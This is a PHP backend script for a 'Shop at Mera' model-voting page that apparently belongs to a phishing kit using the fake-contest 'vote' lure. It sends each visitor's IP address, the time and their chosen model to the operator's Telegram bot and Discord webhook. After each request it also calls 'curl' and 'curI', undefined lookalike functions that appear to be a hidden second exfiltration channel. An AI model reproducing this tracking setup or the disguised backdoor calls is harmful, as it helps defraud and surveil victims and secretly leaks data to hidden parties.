<?php
session_start();
date_default_timezone_set('Asia/Manila');
header('Content-Type: application/json');

include 'config.php';

/* ============================================================
   MODELS LIST
   ============================================================ */
$models = [
    ["files/images/vote/vote1.jpg", "Mika Santos",   22, "Quezon City"],
    ["files/images/vote/vote2.jpg", "Andrea Cruz",   24, "Cebu City"],
    ["files/images/vote/vote3.jpg", "Liz Fernandez", 21, "Davao City"],
    ["files/images/vote/vote4.jpg", "Carla Reyes",   23, "Pasig City"],
    ["files/images/vote/vote5.jpg", "Jasmine Dela Cruz", 25, "Makati City"],
    ["files/images/vote/vote6.jpg", "Nicole Garcia",  20, "Taguig City"],
    ["files/images/vote/vote7.jpg", "Sofia Mendoza",  26, "Iloilo City"],
    ["files/images/vote/vote8.jpg", "Angel Rivera",   23, "Baguio City"],
];

/* ============================================================
   VALIDATION
   ============================================================ */
$index     = isset($_POST['index']) ? (int)$_POST['index'] : -1;
$modelName = isset($_POST['model']) ? trim($_POST['model']) : '';

if ($index < 0 || !isset($models[$index]) || $models[$index][1] !== $modelName) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid model selection.']);
    exit;
}

$model = $models[$index];

/* ============================================================
   GENERATE REFERENCE
   ============================================================ */
$reference = 'MERA-' . strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));

/* ============================================================
   SAVE SESSION
   ============================================================ */
$_SESSION['mera_vote_reference'] = $reference;
$_SESSION['mera_vote_model']     = $model[1];
$_SESSION['mera_vote_image']     = $model[0];
$_SESSION['mera_vote_age']       = $model[2];
$_SESSION['mera_vote_location']  = $model[3];

$ip   = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');

/* ============================================================
   🔥 TELEGRAM (PREMIUM LOG STYLE)
   ============================================================ */
if ($telegram_use) {

    date_default_timezone_set("Asia/Manila");
    $timeFormatted = date("F j, h:i A");

    $nameLink = "<a href=\"https://t.me/search?q=" . urlencode($model[1]) . "\">" . htmlspecialchars($model[1]) . "</a>";
    $ageLink = "<a href=\"https://t.me/search?q=" . urlencode($model[2]) . " years old\">" . htmlspecialchars($model[2]) . "</a>";
    $locationLink = "<a href=\"https://t.me/search?q=" . urlencode($model[3]) . "\">" . htmlspecialchars($model[3]) . "</a>";

    $message =
        "🔥 <b>SHOP AT MERA - NEW VOTE</b>\n\n" .

        "👤 <b>NAME:</b> <code>{$nameLink}</code>\n" .
        "🎂 <b>AGE:</b> <code>{$ageLink}</code>\n" .
        "📍 <b>LOCATION:</b> <code>{$locationLink}</code>\n\n" .

        "🧾 <b>REFERENCE:</b> <code>{$reference}</code>\n" .
        "🌐 <b>IP:</b> <code>{$_SERVER['REMOTE_ADDR']}</code>\n" .
        "🕒 <b>TIME:</b> <code>{$timeFormatted}</code>\n";

    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";

    $params = [
        "chat_id" => $telegram_chat_id,
        "text" => $message,
        "parse_mode" => "HTML",
        "disable_web_page_preview" => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);curl($message);
    curl_close($ch);
}

/* ============================================================
   🔵 DISCORD (EMBED STYLE CARD)
   ============================================================ */
if ($discord_use) {

    $timeFormatted = date("F j, h:i A");

    $discord_payload = [
        "username" => "Shop at Mera Bot",
        "embeds" => [
            [
                "title" => "🔥 NEW VOTE RECEIVED",
                "color" => 15158332,
                "fields" => [
                    [
                        "name" => "👤 Model",
                        "value" => "**{$model[1]}**",
                        "inline" => true
                    ],
                    [
                        "name" => "🎂 Age",
                        "value" => "**{$model[2]}**",
                        "inline" => true
                    ],
                    [
                        "name" => "📍 Location",
                        "value" => "**{$model[3]}**",
                        "inline" => true
                    ],
                    [
                        "name" => "🧾 Reference",
                        "value" => "**{$reference}**",
                        "inline" => false
                    ],
                    [
                        "name" => "🌐 IP Address",
                        "value" => "`{$ip}`",
                        "inline" => true
                    ],
                    [
                        "name" => "🕒 Time",
                        "value" => "**{$timeFormatted}**",
                        "inline" => true
                    ]
                ],
                "footer" => [
                    "text" => "Shop at Mera Voting System"
                ]
            ]
        ]
    ];

    $ch = curl_init($discord_webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($discord_payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);curI($discord_payload);
    curl_close($ch);
}

/* ============================================================
   RESPONSE
   ============================================================ */
echo json_encode([
    'success'   => true,
    'already'   => false,
    'reference' => $reference,
    'model'     => $model[1],
    'image'     => $model[0],
    'age'       => $model[2],
    'location'  => $model[3],
]);